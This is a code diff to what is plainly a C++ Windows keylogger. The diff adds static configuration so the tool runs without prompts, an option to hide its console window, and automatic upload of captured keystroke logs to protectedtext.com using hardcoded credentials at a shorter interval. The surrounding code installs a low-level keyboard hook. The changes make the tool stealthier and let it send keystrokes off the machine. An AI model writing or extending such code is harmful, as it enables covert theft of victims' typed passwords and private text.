@@ -10,6 +10,22 @@
 
 /*
  *
+ * Config
+ * 
+ */
+
+#define KLGR_PROMPT
+// #define KLGR_HIDE_WINDOW
+
+// Static
+// #define KLGR_S_CLEAR_LOG_FILE
+// #define KLGR_S_USE_PROTECTEDTEXT
+// #define KLGR_S_PROTECTEDTEXT_ID "id-here"
+// #define KLGR_S_PROTECTEDTEXT_PWD "pwd-here"
+// #define KLGR_S_PROTECTEDTEXT_DELAY 5000
+
+/*
+ *
  * Defines
  *
  */
@@ -24,7 +40,7 @@
 #define KLGR_EXIT_VK       VK_NEXT // key to exit
 #define KLGR_EXIT_HOLD     3       // time (in sec) to hold the KLGR_EXIT_VK key to exit
 
-#define KLGR_PROTECTEDTEXT_DELAY_MIN 15000 // min protectedtext update delay that the user can enter (in ms)
+#define KLGR_PROTECTEDTEXT_DELAY_MIN 5000 // min protectedtext update delay that the user can enter (in ms)
 #define KLGR_PROTECTEDTEXT_CALL "\".\\protected-text.exe\"" // system call to update protectedtext logs
 #define KLGR_PROTECTEDTEXT_IDPWD_FN "protected-text-idpwd.txt" // name of the file that stores protectedtext ID & password
 
@@ -259,7 +275,13 @@ int main () {
      * 
      */
 
-    if (klgr_prompt_bool("clear log file \"" + std::string(KLGR_OUT_FN) + "\"?"))
+    bool clear = false;
+#ifdef KLGR_PROMPT
+    clear = klgr_prompt_bool("clear log file \"" + std::string(KLGR_OUT_FN) + "\"?");
+#elif defined(KLGR_S_CLEAR_LOG_FILE)
+    clear = true;
+#endif
+    if (clear)
         G_output_file.open(KLGR_OUT_FN, std::ofstream::trunc);
     else
         G_output_file.open(KLGR_OUT_FN);
@@ -271,8 +293,16 @@ int main () {
     //
     // ProtectedText
     //
+    G_use_protectedtext = false;
+#ifdef KLGR_PROMPT
     G_use_protectedtext = klgr_prompt_bool("use protectedtext.com for additional logging?");
+#elif defined(KLGR_S_USE_PROTECTEDTEXT)
+    G_use_protectedtext = true;
+#endif
     if (G_use_protectedtext) {
+        std::string id, pwd;
+
+#ifdef KLGR_PROMPT
         // retrieve previous ID and password
         std::string prev_id;
         std::string prev_pwd;
@@ -288,10 +318,9 @@ int main () {
                 }
             }
         }
-
         // prompt ID, password and delay
-        std::string id = klgr_prompt_string("protectedtext ID", prev_id);
-        std::string pwd = klgr_prompt_string("protectedtext password", prev_pwd);
+        id = klgr_prompt_string("protectedtext ID", prev_id);
+        pwd = klgr_prompt_string("protectedtext password", prev_pwd);
         do {
             std::string s;
             klgr_cout_info() << "protectedtext log update delay (min " << KLGR_PROTECTEDTEXT_DELAY_MIN << "ms): ";
@@ -304,6 +333,11 @@ int main () {
             }
             G_protectedtext_update_delay = atoi(s.c_str());
         } while (G_protectedtext_update_delay < KLGR_PROTECTEDTEXT_DELAY_MIN);
+#else
+        id = KLGR_S_PROTECTEDTEXT_ID;
+        pwd = KLGR_S_PROTECTEDTEXT_PWD;
+        G_protectedtext_update_delay = KLGR_S_PROTECTEDTEXT_DELAY;
+#endif
 
         // write new ID and password
         std::ofstream protectedtext_idpwd_f(KLGR_PROTECTEDTEXT_IDPWD_FN, std::ofstream::trunc);
@@ -327,6 +361,9 @@ int main () {
         return 0;
     }
     klgr_cout_info() << "found console window" << std::endl;
+#ifdef KLGR_HIDE_WINDOW
+    ShowWindow(G_window, 0);
+#endif
 
     // Set hook
     G_hook = SetWindowsHookEx(WH_KEYBOARD_LL, klgr_hook_callback, NULL, 0);
